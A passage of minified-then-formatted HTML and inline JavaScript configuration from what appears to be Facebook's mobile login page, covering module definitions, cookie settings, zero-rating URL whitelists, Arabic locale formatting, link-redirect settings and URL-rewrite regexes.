                  shouldShowCookieBanner: false,
                },
                4328,
              ],
              [
                "TrustedTypesConfig",
                [],
                { useTrustedTypes: false, reportOnly: false },
                4548,
              ],
              [
                "WebConnectionClassServerGuess",
                [],
                { connectionClass: "MODERATE" },
                4705,
              ],
              [
                "BootloaderEndpointConfig",
                [],
                {
                  debugNoBatching: false,
                  endpointURI:
                    "https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/",
                },
                5094,
              ],
              [
                "CookieConsentIFrameConfig",
                [],
                {
                  consent_param:
                    "FQAREhIA.ARab_RGu5v1SsNVJT_dIxMJRWBdIzwugirqOuvG-M8kG2_L4",
                  allowlisted_iframes: [],
                },
                5540,
              ],
              [
                "cr:696703",
                [],
                {
                  __rc: [
                    null,
                    "Aa1GP5ubmjckOgol9qNF0OX_iXfnd59t3BtENFrOVSZnIWkHC7ATfkDHHQAzGjObnNCdYM_wBpGeRRLuXc_m2A-Fd4Y",
                  ],
                },
                -1,
              ],
              [
                "cr:717822",
                ["TimeSliceImpl"],
                {
                  __rc: [
                    "TimeSliceImpl",
                    "Aa1GP5ubmjckOgol9qNF0OX_iXfnd59t3BtENFrOVSZnIWkHC7ATfkDHHQAzGjObnNCdYM_wBpGeRRLuXc_m2A-Fd4Y",
                  ],
                },
                -1,
              ],
              [
                "cr:729414",
                [],
                {
                  __rc: [
                    null,
                    "Aa0-bjbBHsby91LeC0ckOXyq_A1dvswjYrhAAwJExceNNsXtpoh1KfcGf5k8nGmPJ3Y0FQDpUuLc5pCxJKJqwX0k",
                  ],
                },
                -1,
              ],
            ],
            require: [
              ["MPrelude\u004035a7878db5730f8170f1aca8a84e817d"],
              ["VisualCompletionGating\u004000240d8b79ab2a198fb23d6c22db1c85"],
              [
                "RequireDeferredReference\u00400364b3609207dcdd1bb0409797bfbc79",
                "unblock",
                [],
                [["VisualCompletionGating"], "sd"],
              ],
              [
                "RequireDeferredReference\u00400364b3609207dcdd1bb0409797bfbc79",
                "unblock",
                [],
                [["VisualCompletionGating"], "css"],
              ],
            ],
          });
        }
      );
    </script>
    <script>
      now_inl = (function () {
        var p = window.performance;
        return p && p.now && p.timing && p.timing.navigationStart
          ? function () {
              return p.now() + p.timing.navigationStart;
            }
          : function () {
              return new Date().getTime();
            };
      })();
      window.__bigPipeFR = now_inl();
    </script>
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yb/l/0,cross/vrw1-HRIFub.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yQ/l/0,cross/QYtaTzkir1k.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yk/r/J-zOLqpAwWd.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce=""
    />
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3iZfD4/yY/l/ar_AR/4U3yd2j4koQ.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce=""
    />
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y0/l/0,cross/5PiBf0gOoe5.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yO/l/0,cross/zLYYnytI51B.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yo/l/0,cross/8iSAwHXzun9.css?_nc_x=Ij3Wp8lg5Kz"
      as="style"
      crossorigin="anonymous"
    />
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ym/r/1c-S99MMZKC.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce=""
    />
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce=""
    />
    <link
      rel="preload"
      href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz"
      as="script"
      crossorigin="anonymous"
      nonce=""
    />
    <script>
      window.__bigPipeCtor = now_inl();
      requireLazy(["BigPipe"], function (BigPipe) {
        define("__bigPipe", [], (window.bigPipe = new BigPipe({
          forceFinish: true,
          config: {
            flush_pagelets_asap: true,
            dispatch_pagelet_replayable_actions: false,
          },
        })));
      });
    </script>
    <script nonce="">
      (function () {
        var n = now_inl();
        requireLazy(["__bigPipe"], function (bigPipe) {
          bigPipe.beforePageletArrive("first_response", n);
        });
      })();
    </script>
    <script nonce="">
      requireLazy(["__bigPipe"], function (bigPipe) {
        bigPipe.onPageletArrive({
          displayResources: [
            "MoYpVB9",
            "LkM1EDH",
            "M5XDl+E",
            "58kqqKw",
            "bGPbhqq",
            "ObVQb8y",
            "zc1gkMl",
            "vF0qXZY",
            "bJ922yg",
            "FJqL2Al",
          ],
          id: "first_response",
          phase: 0,
          last_in_phase: true,
          tti_phase: 0,
          all_phases: [63],
          jsmods: {
            define: [
              ["CookieDomain", [], { domain: "facebook.com" }, 6421],
              [
                "CookieCoreConfig",
                [],
                {
                  c_user: { s: "None" },
                  cppo: { t: 86400, s: "None" },
                  dpr: { t: 604800, s: "None" },
                  fbl_ci: { t: 31536000, s: "None" },
                  fbl_cs: { t: 31536000, s: "None" },
                  fbl_st: { t: 31536000, s: "Strict" },
                  i_user: { s: "None" },
                  locale: { t: 604800, s: "None" },
                  m_pixel_ratio: { t: 604800, s: "None" },
                  noscript: { s: "None" },
                  presence: { t: 2592000, s: "None" },
                  sfau: { s: "None" },
                  usida: { s: "None" },
                  vpd: { t: 5184000, s: "Lax" },
                  wd: { t: 604800, s: "Lax" },
                  "x-referer": { s: "None" },
                  "x-src": { t: 1, s: "None" },
                },
                2104,
              ],
              ["ZeroCategoryHeader", [], {}, 1127],
              [
                "ZeroRewriteRules",
                [],
                {
                  rewrite_rules: { m: "m", mobile: "m" },
                  whitelist: {
                    "/hr/r": 1,
                    "/hr/p": 1,
                    "/zero/unsupported_browser/": 1,
                    "/zero/policy/optin": 1,
                    "/zero/optin/write/": 1,
                    "/zero/optin/legal/": 1,
                    "/zero/optin/free/": 1,
                    "/about/privacy/": 1,
                    "/about/privacy/update/": 1,
                    "/privacy/explanation/": 1,
                    "/zero/toggle/welcome/": 1,
                    "/zero/toggle/nux/": 1,
                    "/zero/toggle/settings/": 1,
                    "/fup/interstitial/": 1,
                    "/work/landing": 1,
                    "/work/login/": 1,
                    "/work/email/": 1,
                    "/ai.php": 1,
                    "/js_dialog_resources/dialog_descriptions_android.json": 0,
                    "/connect/jsdialog/MPlatformAppInvitesJSDialog/": 0,
                    "/connect/jsdialog/MPlatformOAuthShimJSDialog/": 0,
                    "/connect/jsdialog/MPlatformLikeJSDialog/": 0,
                    "/qp/interstitial/": 1,
                    "/qp/action/redirect/": 1,
                    "/qp/action/close/": 1,
                    "/zero/support/ineligible/": 1,
                    "/zero_balance_redirect/": 1,
                    "/zero_balance_redirect": 1,
                    "/zero_balance_redirect/l/": 1,
                    "/l.php": 1,
                    "/lsr.php": 1,
                    "/ajax/dtsg/": 1,
                    "/checkpoint/block/": 1,
                    "/exitdsite": 1,
                    "/zero/balance/pixel/": 1,
                    "/zero/balance/": 1,
                    "/zero/balance/carrier_landing/": 1,
                    "/zero/flex/logging/": 1,
                    "/tr": 1,
                    "/tr/": 1,
                    "/sem_campaigns/sem_pixel_test/": 1,
                    "/bookmarks/flyout/body/": 1,
                    "/zero/subno/": 1,
                    "/confirmemail.php": 1,
                    "/policies/": 1,
                    "/mobile/internetdotorg/classifier/": 1,
                    "/zero/dogfooding": 1,
                    "/xti.php": 1,
                    "/zero/fblite/config/": 1,
                    "/hr/zsh/wc/": 1,
                    "/ajax/bootloader-endpoint/": 1,
                    "/mobile/zero/carrier_page/": 1,
                    "/mobile/zero/carrier_page/education_page/": 1,
                    "/mobile/zero/carrier_page/feature_switch/": 1,
                    "/mobile/zero/carrier_page/settings_page/": 1,
                    "/aloha_check_build": 1,
                    "/upsell/zbd/softnudge/": 1,
                    "/mobile/zero/af_transition/": 1,
                    "/mobile/zero/af_transition/action/": 1,
                    "/mobile/zero/freemium/": 1,
                    "/mobile/zero/freemium/redirect/": 1,
                    "/mobile/zero/freemium/zero_fup/": 1,
                    "/privacy/policy/": 1,
                    "/privacy/center/": 1,
                    "/data/manifest/": 1,
                    "/4oh4.php": 1,
                    "/autologin.php": 1,
                    "/birthday_help.php": 1,
                    "/checkpoint/": 1,
                    "/contact-importer/": 1,
                    "/cr.php": 1,
                    "/legal/terms/": 1,
                    "/login.php": 1,
                    "/login/": 1,
                    "/mobile/account/": 1,
                    "/n/": 1,
                    "/remote_test_device/": 1,
                    "/upsell/buy/": 1,
                    "/upsell/buyconfirm/": 1,
                    "/upsell/buyresult/": 1,
                    "/upsell/promos/": 1,
                    "/upsell/continue/": 1,
                    "/upsell/h/promos/": 1,
                    "/upsell/loan/learnmore/": 1,
                    "/upsell/purchase/": 1,
                    "/upsell/promos/upgrade/": 1,
                    "/upsell/buy_redirect/": 1,
                    "/upsell/loan/buyconfirm/": 1,
                    "/upsell/loan/buy/": 1,
                    "/upsell/sms/": 1,
                    "/wap/a/channel/reconnect.php": 1,
                    "/wap/a/nux/wizard/nav.php": 1,
                    "/wap/appreg.php": 1,
                    "/wap/birthday_help.php": 1,
                    "/wap/c.php": 1,
                    "/wap/confirmemail.php": 1,
                    "/wap/cr.php": 1,
                    "/wap/login.php": 1,
                    "/wap/r.php": 1,
                    "/zero/datapolicy": 1,
                    "/a/timezone.php": 1,
                    "/a/bz": 1,
                    "/bz/reliability": 1,
                    "/r.php": 1,
                    "/mr/": 1,
                    "/reg/": 1,
                    "/registration/log/": 1,
                    "/terms/": 1,
                    "/f123/": 1,
                    "/expert/": 1,
                    "/experts/": 1,
                    "/terms/index.php": 1,
                    "/terms.php": 1,
                    "/srr/": 1,
                    "/msite/redirect/": 1,
                    "/fbs/pixel/": 1,
                    "/contactpoint/preconfirmation/": 1,
                    "/contactpoint/cliff/": 1,
                    "/contactpoint/confirm/submit/": 1,
                    "/contactpoint/confirmed/": 1,
                    "/contactpoint/login/": 1,
                    "/preconfirmation/contactpoint_change/": 1,
                    "/help/contact/": 1,
                    "/survey/": 1,
                    "/upsell/loyaltytopup/accept/": 1,
                    "/settings/": 1,
                    "/lite/": 1,
                    "/zero_status_update/": 1,
                    "/operator_store/": 1,
                    "/upsell/": 1,
                    "/wifiauth/login/": 1,
                  },
                },
                1478,
              ],
              [
                "CookieCoreLoggingConfig",
                [],
                {
                  maximumIgnorableStallMs: 16.67,
                  sampleRate: 9.7e-5,
                  sampleRateClassic: 1.0e-10,
                  sampleRateFastStale: 1.0e-8,
                },
                3401,
              ],
              [
                "ServerTimeData",
                [],
                {
                  serverTime: 1654722650437,
                  timeOfRequestStart: 1654722650348.1,
                  timeOfResponseStart: 1654722650348.1,
                },
                5943,
              ],
              ["IntlVariationHoldout", [], { disable_variation: false }, 6533],
              [
                "FbtResultGK",
                [],
                { shouldReturnFbtResult: true, inlineMode: "NO_INLINE" },
                876,
              ],
              [
                "IntlPhonologicalRules",
                [],
                {
                  meta: {
                    "/_RTL/": "(([֐-ֿ]|[׀-߿]))",
                    "/_Delim/": "(\u0001‏)",
                    "/_B/": "([.,!?\\s]|^)",
                    "/_E/": "([.,!?\\s]|$)",
                  },
                  patterns: {
                    "/ة_Delim_RTL/": "ت\u0001$2",
                    "/_RTL_Delim(\\s*)_RTL/": "$1\u0001$4$5",
                    "/_\u0001([^\u0001]*)\u0001/": "javascript",
                  },
                },
                1496,
              ],
              [
                "IntlViewerContext",
                [],
                { GENDER: 1, regionalLocale: null },
                772,
              ],
              [
                "MJSEnvironment",
                [],
                {
                  IS_APPLE_WEBKIT_IOS: false,
                  IS_TABLET: false,
                  IS_ANDROID: true,
                  IS_CHROME: true,
                  IS_FIREFOX: false,
                  IS_WINDOWS_PHONE: false,
                  IS_SAMSUNG_DEVICE: true,
                  OS_VERSION: 8,
                  PIXEL_RATIO: 1,
                  BROWSER_NAME: "Chrome Mobile",
                },
                46,
              ],
              [
                "MLoadingIndicatorSigils",
                [],
                {
                  ANIMATE: "m-loading-indicator-animate",
                  ROOT: "m-loading-indicator-root",
                },
                279,
              ],
              [
                "NumberFormatConfig",
                [],
                {
                  decimalSeparator: "٫",
                  numberDelimiter: "٬",
                  minDigitsForThousandsSeparator: 4,
                  standardDecimalPatternInfo: {
                    primaryGroupSize: 3,
                    secondaryGroupSize: 3,
                  },
                  numberingSystemData: { digits: "٠١٢٣٤٥٦٧٨٩" },
                },
                54,
              ],
              [
                "UserAgentData",
                [],
                {
                  browserArchitecture: "32",
                  browserFullVersion: "87.0.4280.141",
                  browserMinorVersion: 0,
                  browserName: "Chrome",
                  browserVersion: 87,
                  deviceName: "Unknown",
                  engineName: "WebKit",
                  engineVersion: "537.36",
                  platformArchitecture: "32",
                  platformName: "Android",
                  platformVersion: "8",
                  platformFullVersion: "8.0.0",
                },
                527,
              ],
              [
                "IntlNumberTypeConfig",
                [],
                {
                  impl: "if (n === 0) { return IntlVariations.NUMBER_ZERO; } else if (n === 1) { return IntlVariations.NUMBER_ONE; } else if (n === 2) { return IntlVariations.NUMBER_TWO; } else if (n % 100 >= 3 && n % 100 \x3C= 10) { return IntlVariations.NUMBER_FEW; } else if (n % 100 >= 11 && n % 100 \x3C= 99) { return IntlVariations.NUMBER_MANY; } else { return IntlVariations.NUMBER_OTHER; }",
                },
                3405,
              ],
              [
                "MWebStorageMonsterWhiteList",
                [],
                {
                  whitelist: [
                    "^CacheStorageVersion$",
                    "^RTC_VIDEO_INPUT$",
                    "^RTC_AUDIO_INPUT$",
                    "^RTC_AUDIO_OUTPUT$",
                    "^RTC_IS_AUDIO_ONLY$",
                    "^RTC_NOISE_SUPPRESSION$",
                    "^RTC_MUTE_STATE$",
                    "^Session$",
                    "^_oz_",
                    "^_video_bandwidthEstimate$",
                    "^Banzai$",
                    "^bz",
                    "^banzai\\:last_storage_flush$",
                    "^falco_queue_",
                    "^mutex",
                    "^msys",
                    "^Bandicoot\\:",
                    "^imp_seq_num$",
                    "^qe_switcher_nub_selection$",
                    "^TabId$",
                    "^sp_pi$",
                    "^\\:userchooser\\:osessusers$",
                    "^\\:userchooser\\:settings$",
                    "^brands\\:console\\:config$",
                    "^consoleEnabled$",
                    "^__fb_messenger_desktop_presence_info$",
                    "^vc_",
                    "^_showMDevConsole$",
                    "^ga_client_id$",
                    "^_mswam_$",
                    "^am_recently_used_filters\\:",
                    "^am_image_size_cache$",
                    "^ickt$",
                    "^hb_timestamp$",
                    "^signal_flush_timestamp$",
                    "^last_fast_refresh$",
                    "^_ctv_access_token$",
                    "^_ctv_android_device_info$",
                    "^_ctv_cast_access_token$",
                    "^_ctv_casting_remote$",
                    "^_ctv_console_log_viewer_on_full_screen_player_enabled$",
                    "^_ctv_cookie_consent_displayed$",
                    "^_ctv_debug_redux_logger_enabled$",
                    "^_ctv_deviceUniqueIDFallback$",
                    "^_ctv_gaming_consent_displayed$",
                    "^_ctv_installed_app_player_debug_overlay_enabled$",
                    "^_ctv_last_load_time_ms$",
                    "^_ctv_locale$",
                    "^_ctv_logged_out_constraints_sessions_count$",
                    "^_ctv_reloadedDueToStaleApp$",
                    "^_ctv_reloadedDueToUnrecoverableError$",
                    "^_ctv_search_terms$",
                    "^_ctv_tv_experiments$",
                    "^_ctv_usedCloseAppFallback$",
                    "^_ctv_user_sessions$",
                    "^_ctv_video_debug_overlay_enabled$",
                    "^_ctv_debug_rampart_server_number$",
                    "^fx_did$",
                    "^wa_lang_banner_dismissed$",
                    "^bulletin_article_reader_onload_dialog_seen$",
                    "^bulletin_session_attributes$",
                    "^md_survey$",
                    "^support_guest_chat$",
                    "^comet_is_recent_profile_switch$",
                    "^comet_console_position$",
                    "^mw_exchange_vm$",
                    "^has_seen_email_login_toast$",
                  ],
                },
                254,
              ],
              [
                "MobileAppDetect",
                [],
                {
                  is_mobile_app: false,
                  is_ads_manager_app: false,
                  is_pages_manager: false,
                  is_facebook_for_android: false,
                  is_facebook_for_android_in_app_browser: false,
                  is_android_faceweb: false,
                  is_facebook_for_ios: false,
                  is_instagram: false,
                  is_messenger_for_android: false,
                  is_messenger_for_ios: false,
                  is_messenger_lite_for_android: false,
                  is_messenger_lite_for_ios: false,
                  is_wilde: false,
                  is_kaios: false,
                },
                1109,
              ],
              [
                "LinkshimHandlerConfig",
                [],
                {
                  supports_meta_referrer: true,
                  default_meta_referrer_policy: "origin-when-crossorigin",
                  switched_meta_referrer_policy: "origin",
                  non_linkshim_lnfb_mode: null,
                  link_react_default_hash:
                    "AT1bivtacFJP1bDIDtMrVZ3lGiETIB1PhZ7S-3MbJdV8aud6_v3jgOru6aHOccN-b1Ocx2Y6KJFpmabSzOVkFGeqZacUYzNgWBoBfs-kqT9NfMlDuqLSclLieKvy-m1SPdyQIfdTtxKljQ9n9PaK",
                  untrusted_link_default_hash:
                    "AT08FKSYEUMEAp4ggrs-74QwYeftyVUdnd6ZNgG93rEUjB4lt5M_avS_BOtDxEXoRm27kM5kpaZVsbZsKJkOimXAfOtAkJICVmTBTXZ5_B8thlS5vsoWFi8SahRPNSGEgCm_1j3tNh1S67qT7YJr",
                  linkshim_host: "lm.facebook.com",
                  linkshim_path: "/l.php",
                  linkshim_enc_param: "h",
                  linkshim_url_param: "u",
                  use_rel_no_opener: true,
                  always_use_https: true,
                  onion_always_shim: true,
                  middle_click_requires_event: true,
                  www_safe_js_mode: "asynclazy",
                  m_safe_js_mode: "MLynx_asynclazy",
                  ghl_param_link_shim: false,
                  click_ids: [],
                  is_linkshim_supported: true,
                  current_domain: "facebook.com",
                  blocklisted_domains: [
                    "ad.doubleclick.net",
                    "ads-encryption-url-example.com",
                    "bs.serving-sys.com",
                    "ad.atdmt.com",
                    "adform.net",
                    "ad13.adfarm1.adition.com",
                    "ilovemyfreedoms.com",
                    "secure.adnxs.com",
                  ],
                  is_mobile_device: true,
                },
                27,
              ],
              [
                "MemoryLoggerConfigWebSitevarConfig",
                [],
                { measurement_interval_minutes: 5 },
                5573,
              ],
              ["FWLoader", [], {}, 278],
              ["ImmediateActiveSecondsConfig", [], { sampling_rate: 0 }, 423],
              [
                "MPageControllerGating",
                [],
                {
                  shouldDeferUntilCertainNoRedirect: false,
                  shouldReleaseFetcherLock: false,
                  shouldLoadingScreenSetScriptPath: false,
                  shouldRenderAsync404: false,
                },
                2023,
              ],
              ["FbtQTOverrides", [], { overrides: {} }, 551],
              [
                "AnalyticsCoreData",
                [],
                {
                  device_id:
                    "$^|AcYCWg92Dk1NGbpmLUszLz0Kmq3cjjZ67j791ytjGREdIUbz8QTvX4eoGVILLnCMPkRtKNeEJrnwqRtyA-uKeNyvUmmIww0|fd.AcYLtR_rdZ44FHeAocRWTFS0WlGyyt80H4cKCg2ntIKOMV-4eFJFhc4ITcjsbRfORlEy7Noq_WSWfX6YkXkAmAZO",
                  app_id: "412378670482",
                  enable_bladerunner: false,
                  enable_ack: true,
                  push_phase: "C3",
                  enable_observer: false,
                  enable_dataloss_timer: false,
                  enable_fallback_for_br: true,
                  fix_br_init_rc: true,
                },
                5237,
              ],
              [
                "cr:1642797",
                ["BanzaiBase"],
                {
                  __rc: [
                    "BanzaiBase",
                    "Aa1GP5ubmjckOgol9qNF0OX_iXfnd59t3BtENFrOVSZnIWkHC7ATfkDHHQAzGjObnNCdYM_wBpGeRRLuXc_m2A-Fd4Y",
                  ],
                },
                -1,
              ],
              [
                "cr:694370",
                ["requestIdleCallbackBlue"],
                {
                  __rc: [
                    "requestIdleCallbackBlue",
                    "Aa1GP5ubmjckOgol9qNF0OX_iXfnd59t3BtENFrOVSZnIWkHC7ATfkDHHQAzGjObnNCdYM_wBpGeRRLuXc_m2A-Fd4Y",
                  ],
                },
                -1,
              ],
              [
                "cr:692209",
                ["cancelIdleCallbackBlue"],
                {
                  __rc: [
                    "cancelIdleCallbackBlue",
                    "Aa1GP5ubmjckOgol9qNF0OX_iXfnd59t3BtENFrOVSZnIWkHC7ATfkDHHQAzGjObnNCdYM_wBpGeRRLuXc_m2A-Fd4Y",
                  ],
                },
                -1,
              ],
              [
                "MBanzaiConfig",
                [],
                {
                  MAX_SIZE: 10000,
                  MAX_WAIT: 30000,
                  MIN_WAIT: null,
                  RESTORE_WAIT: 30000,
                  blacklist: ["time_spent"],
                  disabled: false,
                  gks: {
                    platform_oauth_client_events: true,
                    boosted_pagelikes: true,
                  },
                  known_routes: [
                    "artillery_javascript_actions",
                    "artillery_javascript_trace",
                    "artillery_logger_data",
                    "logger",
                    "falco",
                    "gk2_exposure",
                    "js_error_logging",
                    "loom_trace",
                    "marauder",
                    "perfx_custom_logger_endpoint",
                    "qex",
                    "require_cond_exposure_logging",
                    "sri_logger_data",
                  ],
                  should_drop_unknown_routes: true,
                  should_log_unknown_routes: false,
                },
                32,
              ],
            ],
            instances: [
              [
                "__inst_dfbc3ade_0_0_vL",
                [
                  "MLoggedOutBannerGooglePlayRedirectWithFallback",
                  "__elem_729c1b93_0_0_xU",
                ],
                [
                  {
                    button: { __m: "__elem_729c1b93_0_0_xU" },
                    native_app_url:
                      "https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253Do8kSYhILomTbOsVFLQK7nxD3%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1",
                    fallback_url:
                      "https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253Do8kSYhILomTbOsVFLQK7nxD3%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1",
                    logging_data: {
                      app_referrer: "logged_out_banner",
                      app: "350685531728",
                      country: "SD",
                    },
                  },
                ],
                1,
              ],
            ],
            elements: [
              [
                "__elem_de5177dd_0_0_8s@85d008281d4cb49a69601ee1681eb255",
                "u_0_0_pk",
                1,
              ],
              [
                "__elem_729c1b93_0_0_xU@cd9f7497621a364a33133f1a04c950a0",
                "u_0_1_fe",
                1,
              ],
              [
                "__elem_921b58ef_0_0_CR@9fb85ac89b73d6afc8988d39619da3df",
                "login_form",
                2,
              ],
              [
                "__elem_df6b4e4f_0_0_t8@713b74ce15fde8213511a94f6f894350",
                "header_transparency_tooltip",
                1,
              ],
              [
                "__elem_e24cb174_0_0_Ol@6354c9c3d34649db0c99a191827d6dc2",
                "m_login_password",
                1,
              ],
              [
                "__elem_7216e2ae_0_2_FU@ad191f99bc417944b98fefbf4af04ff8",
                "u_0_2_Zj",
                1,
              ],
              [
                "__elem_e03291d5_0_1_0S@9b103c5d6795436a0333411e22ac931c",
                "u_0_3_Vu",
                1,
              ],
              [
                "__elem_e03291d5_0_0_7V@5d125f98a0271fbcb2554650d94de3a1",
                "u_0_4_7a",
                1,
              ],
              [
                "__elem_7216e2ae_0_0_DX@ec5056b85827a219687c74af8df16784",
                "login_password_step_element",
                1,
              ],
              [
                "__elem_8a020238_0_0_o7@b2524d9136fba0282e69be4e8b55e336",
                "forgot-password-link",
                1,
              ],
              [
                "__elem_7216e2ae_0_1_Jy@7fe84bffe16c40511ea4c45e0dc7b3f0",
                "signup_button_area",
                1,
              ],
              [
                "__elem_e980dec4_0_0_nQ@cc48c4f7fc76388dd6d74fb94627b06d",
                "signup-button",
                1,
              ],
              [
                "__elem_49f6b607_0_0_T2@37b988c069de0b15b675328309fed536",
                "root",
                1,
              ],
              [
                "__elem_717bb1ae_0_0_tE@3de4f27645d313776b3577b2a89c0cd3",
                "u_0_5_Rq",
                3,
              ],
              [
                "__elem_ad2bcfb1_0_0_yy@558267d46faed43d67cc8944f9e7e6dc",
                "u_0_6_Ib",
                1,
              ],
              [
                "__elem_eed16c0a_0_0_bH@5c0b99908e1a6d9369e061db4b101b96",
                "u_0_7_zD",
                1,
              ],
              [
                "__elem_a588f507_0_0_E6@dd46f0ce7f158cac1d84f397e2c970cb",
                "u_0_8_e/",
                1,
              ],
              [
                "__elem_a588f507_0_1_EQ@68512e00c070e08a0f3d352e6968b8ec",
                "u_0_9_Xo",
                1,
              ],
              [
                "__elem_0cdc66ad_0_0_3d@ee37ad2feebf3d7341ba8b5b1885fc4c",
                "u_0_b_0q",
                1,
              ],
              [
                "__elem_0cdc66ad_0_1_1v@7d64cdda659958efe455a13941921160",
                "u_0_c_zp",
                1,
              ],
            ],
            require: [
              [
                "MobileZeroRewriteURL@19c2f1a84f86a45b35bd2a9af069fdcd",
                "main",
                [],
                [
                  {
                    regex_matcher: [
                      "^(https?)://(api|api2|z-m-api|api-read|z-p3-api|z-p4-api|b-api)\\.([0-9a-zA-Z\\.-]*)?facebook\\.com(:?[0-9]{0,5})((?:/method/user\\.registerPushCallback|/method/user\\.confirmContactpointPreconfirmation|/method/xconfig\\.fetch|/method/mobile\\.gatekeepers|/method/user\\.unregisterPushCallback|/method/notifications\\.get|/me/notification_seen_states|/method/auth\\.expireSession|/method/auth\\.login|/method/bookmarks\\.get|/me/messenger_only_account_migrations|/method/mobile\\.zeroHeaderRequest|/method/user\\.sendMessengerOnlyPhoneConfirmationCode|/method/user\\.confirmMessengerOnlyPhone|/method/user\\.createMessengerOnlyAccount|/method/user\\.bypassLoginWithConfirmedMessengerCredentials|/method/user\\.prefillorautocompletecontactpoint|/method/user\\.validateregistrationdata|/method/user\\.register)(?:$|\\?.*$|/.*$))",
                      "^(https?)://(.*-)?sonar6?([.-].*)?\\.fbcdn\\.net(:?[0-9]{0,5})($|\\?.*$|/.*$)",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.webm|\\.m4v|\\.mpd)(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net(:?[0-9]{0,5}))(/.*(\\.mp4|\\.webm|\\.m4v|\\.mpd)(\\?.*)?$)",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:1997)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:9024)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:10537)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:11485)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:8221|30361|30362)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
                      "^(https?)://(?:z-1-|z-m-|z-p3-|z-p4-)?([0-9a-zA-Z\\.-]+\\.)((?:fjub2-1|fjub3-1|fkrt1-1|fkrt1-2|fkrt2-1|fkrt2-2|fruh1-1)\\.fna)(\\.fbcdn\\.net)(:?[0-9]{0,5})(.*(?:t[0-9]+\\.(?:30808)-6($|(?:/.*)?(?:\\?(?!.*_nc_ad=z-m.*$)(?=.*oh=.*$).*)$)))",
